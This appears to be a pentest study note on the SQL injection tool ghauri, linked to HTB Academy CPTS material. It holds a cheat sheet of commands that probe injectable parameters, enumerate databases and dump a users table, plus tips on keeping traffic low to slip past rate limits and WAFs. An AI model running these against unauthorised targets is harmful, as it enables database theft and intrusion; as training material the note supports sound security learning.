# ghauri

**Tags:** #ghauri #SQLi #SQLInjection #injection #WebAppAttacks #Scanner #Python

`ghauri` is an advanced SQL injection detection and exploitation tool, written as a lighter alternative to [[Tools/Database/SQLMap|SQLMap]]. It targets the same core techniques — boolean-blind, time-blind, error-based, stacked, and UNION — but sends noticeably fewer requests to confirm an injection, which matters when the target is rate-limited, WAF-fronted, or you're trying to stay quiet. Output is terser than SQLMap's and it needs less flag-tuning to get a clean result on straightforward injections.

It is **not** a full replacement: SQLMap has far broader DBMS coverage, the tamper-script ecosystem, `--os-shell`/`--file-write`, and second-order support. Reach for ghauri first on a simple injectable parameter; fall back to SQLMap when you need extraction depth or evasion.

**Source:** https://github.com/r0oth3x49/ghauri
**Install:** `pipx install git+https://github.com/r0oth3x49/ghauri.git` (or `pip3 install .` from a clone)

```bash
# Test a GET parameter
ghauri -u "http://<TARGET>/page?id=1" --batch

# POST body
ghauri -u "http://<TARGET>/login" --data "user=admin&pass=test" --batch

# From a saved Burp request
ghauri -r request.txt --batch

# Authenticated
ghauri -u "http://<TARGET>/page?id=1" --cookie "session=<VALUE>" --batch

# Enumerate — same verb structure as SQLMap
ghauri -u "http://<TARGET>/page?id=1" --dbs
ghauri -u "http://<TARGET>/page?id=1" -D <DB> --tables
ghauri -u "http://<TARGET>/page?id=1" -D <DB> -T users --dump

# Pin the technique / DBMS to cut request volume further
ghauri -u "http://<TARGET>/page?id=1" --technique=BT --dbms=mysql --batch

# Route through Burp for inspection
ghauri -u "http://<TARGET>/page?id=1" --proxy http://127.0.0.1:8080
```

| Flag | Description |
|---|---|
| `-u` / `-r` | Target URL, or a saved raw HTTP request file |
| `--data` | POST body |
| `--cookie` | Session cookie for authenticated testing |
| `--batch` | Non-interactive; accept defaults |
| `--technique` | `B`oolean, `E`rror, `U`nion, `S`tacked, `T`ime — restrict to cut noise |
| `--dbms` | Skip fingerprinting when the backend is already known |
| `--level` | Raise to reach headers/cookies as injection points |
| `--proxy` | Route through Burp |

> [!tip]
> The reason to pick ghauri over SQLMap is **request volume**. If you're on a target with lockout, rate limiting, or a WAF that scores on request count, ghauri confirming an injection in a fraction of the traffic is the whole value. Once confirmed, you can still hand extraction to SQLMap.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]] (CPTS v2) — full manual methodology this tool automates. Sibling tool: [[Tools/Database/SQLMap|SQLMap]].

---

*Created: 2026-08-17*
*Updated: 2026-08-17*
*Model: claude-opus-5*
